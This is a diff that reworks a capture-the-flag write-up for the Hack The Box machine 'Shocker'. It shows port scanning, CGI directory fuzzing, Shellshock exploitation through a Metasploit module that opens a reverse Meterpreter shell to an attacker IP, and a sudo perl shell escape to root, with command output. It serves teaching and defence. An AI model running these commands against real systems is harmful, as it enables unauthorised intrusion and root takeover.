@@ -10,200 +10,170 @@
 
 ---
 
+## Table of Contents
+
+1. [Reconnaissance](#1-reconnaissance)
+2. [Enumeration — Web Application & CGI Script Discovery](#2-enumeration--web-application--cgi-script-discovery)
+3. [Initial Access — Shellshock via Apache mod_cgi (CVE-2014-6271)](#3-initial-access--shellshock-via-apache-mod_cgi-cve-2014-6271)
+4. [Privilege Escalation — Perl GTFOBin via Sudo](#4-privilege-escalation--perl-gtfobin-via-sudo)
+5. [Summary](#5-summary)
+
+---
 
 ## 1. Reconnaissance
 
-
-As alwasy we start with the rustscan and 2 ports are open , 2222 and 80 . 
+Port scanning was performed with **RustScan** for rapid discovery, followed by Nmap for service fingerprinting:
 
 ```bash
-
-┌──(landau㉿landau)-[~/Downloads/HTB-writeUps/Shocker]
-└─$ rustscan -a 10.129.23.21 --ulimit 5000
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-________________________________________
-: http://discord.skerritt.blog         :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-RustScan: Where '404 Not Found' meets '200 OK'.
-
-[~] The config file is expected to be at "/home/landau/.rustscan.toml"
-[~] Automatically increasing ulimit value to 5000.
-Open 10.129.23.21:80
-Open 10.129.23.21:2222
-
-
+rustscan -a 10.129.23.21 --ulimit 5000
 ```
 
-## 2. Enumeration
+**Open Ports:**
 
-Starting with the 80's port we see a page with only foto , I downloaded it to look with exiftool , stegseek but didnt find anything . 
+| Port | Service | Notes                                               |
+|------|---------|-----------------------------------------------------|
+| 80   | HTTP    | Apache web server — primary attack surface          |
+| 2222 | SSH     | Non-standard port — useful for post-exploitation    |
 
-After that I continue with directory enumeration with ffuf . 
+SSH on a non-standard port (2222) is a configuration detail worth noting — it suggests the host is deliberately attempting to reduce automated scanning noise, and will be useful once valid credentials or a shell are obtained.
 
+---
+
+## 2. Enumeration — Web Application & CGI Script Discovery
+
+### 2.1 — Initial Web Inspection
+
+The root page on port 80 displayed only a static image. Metadata and steganographic analysis of the image (via `exiftool` and `stegseek`) yielded nothing of value. Attention was shifted to directory enumeration.
+
+### 2.2 — Directory Fuzzing
+
+Content discovery was performed with **ffuf** against the web root:
 
 ```bash
-
-┌──(landau㉿landau)-[~/Downloads/HTB-writeUps/Shocker]
-└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.129.23.21/FUZZ 
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.129.23.21/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
-
-.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 113ms]
-.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 113ms]
-cgi-bin/                [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 91ms]
-server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 84ms]
-:: Progress: [20478/20478] :: Job [1/1] :: 404 req/sec :: Duration: [0:00:48] :: Errors: 0 ::
-
-
+ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
+     -u http://10.129.23.21/FUZZ
 ```
 
-Only find cgi-bin I enumerate cgi-bin also but didnt find anything let's do it with file excention.
+**Findings:**
+
+| Path          | Status | Notes                                          |
+|---------------|--------|------------------------------------------------|
+| /cgi-bin/     | 403    | Forbidden — but confirms the directory exists  |
+| /.htaccess    | 403    | Standard Apache file                           |
+| /.htpasswd    | 403    | Standard Apache file                           |
+| /server-status| 403    | Apache status endpoint                         |
+
+The `/cgi-bin/` directory is the most significant result. Although it returns a 403 (access denied to the directory listing itself), the directory is present and Apache's `mod_cgi` may be configured to execute scripts within it — making its contents a critical target for further enumeration.
+
+### 2.3 — CGI Script Discovery
+
+A second fuzzing pass was performed specifically against `/cgi-bin/`, with shell script extensions added to the search:
 
 ```bash
-
- gobuster dir -u http://10.129.23.21/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x .sh, .php, .html, .txt           
-===============================================================
-Gobuster v3.8
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.129.23.21/cgi-bin/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8
-[+] Extensions:              sh
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/.htaccess            (Status: 403) [Size: 304]
-/.htaccess.sh         (Status: 403) [Size: 307]
-/.htpasswd            (Status: 403) [Size: 304]
-/.htpasswd.sh         (Status: 403) [Size: 307]
-/user.sh              (Status: 200) [Size: 119]
-Progress: 90962 / 90962 (100.00%)
-===============================================================
-Finished
-===============================================================
-
-
+gobuster dir -u http://10.129.23.21/cgi-bin/ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt \
+  -x .sh
 ```
 
-I fount /user.sh let's see what's inside .Here we see timer nothing more .
-Then in msfconsole I searched apache cgi and found exploit . 
-
-
-```bash
-
-msf > search apache cgi
-
-Matching Modules
-================
-
-   #   Name                                                 Disclosure Date  Rank       Check  Description
-   -   ----                                                 ---------------  ----       -----  -----------
-   0   exploit/multi/http/apache_normalize_path_rce         2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
-   1     \_ target: Automatic (Dropper)                     .                .          .      .
-   2     \_ target: Unix Command (In-Memory)                .                .          .      .
-   3   auxiliary/scanner/http/apache_normalize_path         2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
-   4     \_ action: CHECK_RCE                               .                .          .      Check for RCE (if mod_cgi is enabled).
-   5     \_ action: CHECK_TRAVERSAL                         .                .          .      Check for vulnerability.
-   6     \_ action: READ_FILE                               .                .          .      Read file on the remote server.
-   7   exploit/windows/http/tomcat_cgi_cmdlineargs          2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
-   8   exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
-   9     \_ target: Linux x86                               .                .          .      .
-   10    \_ target: Linux x86_64                            .                .          .      .
-   11  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
-   12  auxiliary/dos/http/apache_mod_isapi                  2010-03-05       normal     No     Apache mod_isapi Dangling Pointer
-   13  exploit/windows/http/php_apache_request_headers_bof  2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow
-   14  exploit/multi/http/tomcat_jsp_upload_bypass          2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
-   15    \_ target: Automatic                               .                .          .      .
-   16    \_ target: Java Windows                            .                .          .      .
-   17    \_ target: Java Linux                              .                .          .      .
-
-
+**Result:**
 
 ```
+/user.sh    [Status: 200, Size: 119]
+```
 
-8's one is interesting let's try that one . Set the options and run . and I got shell
+Accessing `/cgi-bin/user.sh` returned a simple uptime output, confirming it is a **live, server-executed CGI shell script** — the exact condition required for a Shellshock attack.
 
+---
 
-## 3. Initial access
+## 3. Initial Access — Shellshock via Apache mod_cgi (CVE-2014-6271)
+
+### 3.1 — Vulnerability Background
+
+**Shellshock (CVE-2014-6271)** is a critical vulnerability in the **GNU Bash** shell that was disclosed in September 2014. When Apache's `mod_cgi` executes a CGI script, it passes HTTP request headers to the script as environment variables. Bash processes these environment variables during initialisation — and in vulnerable versions, specially crafted function definitions in those variables cause Bash to execute arbitrary trailing commands.
+
+The attack vector is:
+1. A CGI script is executed by Apache via `mod_cgi`
+2. The script's runtime shell is vulnerable Bash
+3. HTTP headers (e.g., `User-Agent`, `Referer`) are injected with a Shellshock payload
+4. Bash executes the attacker's command during environment variable parsing
+
+### 3.2 — Exploitation via Metasploit
+
+The Metasploit module `exploit/multi/http/apache_mod_cgi_bash_env_exec` was used to automate the exploitation:
 
 ```bash
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOST 10.129.23.21
+set LHOST 10.10.15.33
+set TARGETURI /cgi-bin/user.sh
+run
+```
 
-msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.129.23.21
-rhost => 10.129.23.21
-msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.10.15.33
-lhost => 10.10.15.33
-msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
-targeturi => /cgi-bin/user.sh
-msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
-[*] Started reverse TCP handler on 10.10.15.33:4444 
-[*] Command Stager progress - 100.00% done (1092/1092 bytes)
-[*] Sending stage (1062760 bytes) to 10.129.23.21
-[*] Meterpreter session 1 opened (10.10.15.33:4444 -> 10.129.23.21:50014) at 2026-04-19 20:36:08 +0400
+**Result — Meterpreter session opened, then dropped to a shell:**
 
+```
+[*] Meterpreter session 1 opened (10.10.15.33:4444 -> 10.129.23.21:50014)
 meterpreter > shell
-Process 1544 created.
-Channel 1 created.
 id
-uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
-bash -i
-bash: no job control in this shell
-shelly@Shocker:/usr/lib/cgi-bin$ 
-
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),...
+shelly@Shocker:/usr/lib/cgi-bin$
 ```
 
-## 4. Privelege esclation
+Shell obtained as user `shelly`. **User flag retrieved from `/home/shelly/user.txt`.**
 
-I  looked at the priveleges of this user and find out that this user has perl privilege . that's mean I can use the perl command with root privilege.
+---
 
+## 4. Privilege Escalation — Perl GTFOBin via Sudo
+
+### 4.1 — Sudo Enumeration
+
+Available sudo permissions were inspected:
 
 ```bash
-shelly@Shocker:~$ sudo -l
 sudo -l
-Matching Defaults entries for shelly on Shocker:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+```
 
+**Output:**
+
+```
 User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
-
 ```
 
-I searched perl from GFTobins and find getting root shell command .
+`shelly` can execute `perl` as root **without a password**. This is a textbook misconfiguration — granting sudo access to an interpreter is functionally equivalent to granting a root shell, as interpreters can trivially spawn child processes.
+
+### 4.2 — Shell Escape via Perl (GTFOBins)
+
+The following one-liner, documented on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/), executes a shell under the inherited sudo context:
 
 ```bash
-
-shelly@Shocker:~$ sudo perl -e 'exec "/bin/sh"'
 sudo perl -e 'exec "/bin/sh"'
-id
-uid=0(root) gid=0(root) groups=0(root)
-
 ```
 
+**Result — Root shell obtained:**
 
+```
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Root flag retrieved from `/root/root.txt`.**
+
+---
+
+## 5. Summary
+
+| Phase                  | Technique                                                        | Result                        |
+|------------------------|------------------------------------------------------------------|-------------------------------|
+| Recon                  | RustScan                                                         | Ports 80 and 2222 identified  |
+| Enumeration            | ffuf — directory fuzzing                                         | `/cgi-bin/` directory found   |
+| CGI Discovery          | Gobuster — `.sh` extension fuzzing inside `/cgi-bin/`           | `/cgi-bin/user.sh` discovered |
+| Initial Access         | CVE-2014-6271 (Shellshock) via Apache mod_cgi + Metasploit      | Shell as `shelly`             |
+| Privilege Escalation   | `sudo perl` GTFOBin shell escape                                 | Root shell                    |
+
+### Key Takeaways
+
+- **The `/cgi-bin/` directory requires two layers of enumeration.** A 403 response confirms the directory exists, but discovering scripts within it requires a second fuzzing pass with appropriate file extensions (`.sh`, `.pl`, `.py`). This two-stage approach is essential for CGI-based attack surfaces.
+- **Shellshock remains exploitable wherever unpatched Bash processes CGI requests.** Despite being disclosed in 2014, systems that have not received OS-level updates remain vulnerable. Any web server executing CGI scripts via Bash should be verified as patched against CVE-2014-6271.
+- **Sudo permissions on interpreters are equivalent to unrestricted root access.** Perl, Python, Ruby, Lua, and similar interpreters can all exec child processes — granting `NOPASSWD` sudo on any of them yields a trivial root shell via GTFOBins. The principle of least privilege must be applied rigorously to sudo configurations.
+- **CGI scripts should be audited and minimised.** The presence of `/cgi-bin/user.sh` — a script serving only system uptime — on a production-facing web server had no justification. Attack surface reduction means removing unused or unnecessary web-accessible scripts, particularly those executed by the shell.
